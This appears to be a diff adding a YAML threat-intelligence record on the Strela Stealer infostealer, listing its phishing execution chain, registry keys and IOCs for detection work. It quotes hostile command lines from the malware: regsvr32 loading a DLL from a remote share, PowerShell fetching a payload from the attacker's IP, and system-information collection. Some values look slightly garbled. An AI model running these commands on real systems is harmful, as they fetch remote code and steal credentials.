@@ -1,0 +1,62 @@
+summary: 'The Strela Stealer is an infostealer targeting European countries, specifically
+  focusing on Mozilla Thunderbird and Microsoft Outlook email clients. It utilizes
+  various obfuscation techniques to evade detection and exfiltrates login credentials
+  and system information. The report details a recent phishing campaign delivering
+  the malware, its execution chain, and technical analysis of its components.
+
+  '
+date: 2025-03-06
+authors:
+- Dawid Nesterowicz
+attribution:
+- Hive0145
+- Russian bulletproof hosting providers (Proton66 OOO)
+malware_families:
+- Strela Stealer
+TTPs:
+  processs:
+  - wscript.exe
+  - regsvr32.exe
+  - powershell.exe
+  - systeminfo.exe
+  - ShellExecuteExA
+  commandline:
+  - C:\\Windows\\System32\\wscript.exe "C:\\Users\\Public\\invoice.pdf"
+  - '"C:\\Windows\\system32\\regsvr32.exe" /s \\\\\\193.143.1.205\\davamroot\\\\1909835116765.dll'
+  - powershell.exe -Command Invoke:WebRequest -OutFile Ytemp\\invoice.pdf http://193.143.1.205/invoice.php &
+  - net use \\\\\\193.143.1.205\\davamroot\\\\
+  - systeminfo > XTHP\\{hosts unique id}.txt
+  powershell:
+  - -Command Invoke:WebRequest -OutFile Ytemp\\invoice.pdf http://193.143.1.205/invoice.php
+  scripting_engine:
+  - JScript
+  registry_keys:
+  - HKCU\\Control Panel\\International\\Locale
+  - HKCU\\Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676
+  - HKCU\\Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676
+  - HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676
+  network_connections:
+  - protocol: HTTP
+    port: 8088
+    destination: 193.143.1.205
+  file_modifications:
+  - C:\\Users\\Public\\invoice.pdf
+  - Ytemp\\involce.pdf
+  - XTHP\\{hosts unique id}.txt
+  persistence: null
+  pipes: null
+  process_relations:
+  - wscript.exe -> regsvr32.exe
+  - regsvr32.exe -> powershell.exe
+  - ShellExecuteExA -> systeminfo.exe
+IOCs:
+- filename: 1692630503222433608.js
+- filename: 1909835116765.dll
+- hash: f5c54fce6c9e2f84b084bbf9968c9a76d9cd74a11ccf4fcba29dbe2e4574e3d7
+- hash: 9c49266e315eb76ce73cbe542cfd2bbf28844689944ac8776daecbdcdecd8cf8
+- hash: 31389cb2f067020f181462bab3519c22fd88da084012729e9edf79d15427b86f
+- ip: 193.143.1.205
+- url: hxxp://193.143.1.205/invoice.php
+- url: hxxp://193.143.1.205/up.php
+reference: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/a-deep-dive-into-strela-stealer-and-how-it-targets-european-countries/
+file_creation_date: May 11, 2025
